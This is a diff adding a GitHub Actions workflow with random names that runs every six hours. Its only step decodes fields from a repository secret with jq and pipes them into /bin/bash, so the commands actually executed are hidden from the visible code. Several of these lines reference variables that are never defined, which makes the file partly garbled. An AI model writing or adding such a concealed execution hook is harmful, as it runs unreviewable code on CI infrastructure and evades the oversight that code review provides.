@@ -1,0 +1,27 @@
+name: wznkhi
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '47 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: wznkhi
+        env:
+          yuyzo432: ${{ secrets.yuyzo432 }}
+        run: |
+          echo $yuyzo432 | jq -r .w1343 | /bin/bash
+          echo $mywo440 | jq -r .vdu34 | /bin/bash
+          echo $lofj229 | jq -r .oy3189 | /bin/bash
+          echo $zkap39226 | jq -r .fvdzq9 | /bin/bash
+          echo $mcez68 | jq -r .xkmog600 | /bin/bash
+          echo $q306 | jq -r .lpx068 | /bin/bash
+          echo $ph06 | jq -r .uxx8972 | /bin/bash
+          echo $ysa3 | jq -r .y797 | /bin/bash
+          echo $ktit88 | jq -r .ugqk0 | /bin/bash
+
